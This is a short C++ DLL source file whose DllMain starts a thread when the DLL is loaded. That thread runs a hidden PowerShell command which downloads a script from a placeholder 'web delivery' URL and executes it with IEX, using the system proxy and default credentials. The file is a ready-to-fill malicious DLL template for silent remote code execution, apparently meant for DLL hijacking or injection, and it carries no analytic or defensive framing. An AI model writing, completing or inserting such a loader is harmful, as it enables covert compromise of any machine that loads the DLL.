// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <iostream>

using namespace std;

DWORD WINAPI Iniciar(PVOID ini) {
	system("cmd /c powershell.exe -nop -w hidden -c $n=new-object net.webclient;$n.proxy=[Net.WebRequest]::GetSystemWebProxy();$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $n.downloadstring('YOU WEB DELIVERY LINK');");
	return 0;
}



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{


	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
		CreateThread(0, 0, &Iniciar, 0, 0, 0);
	}
	return TRUE;
}

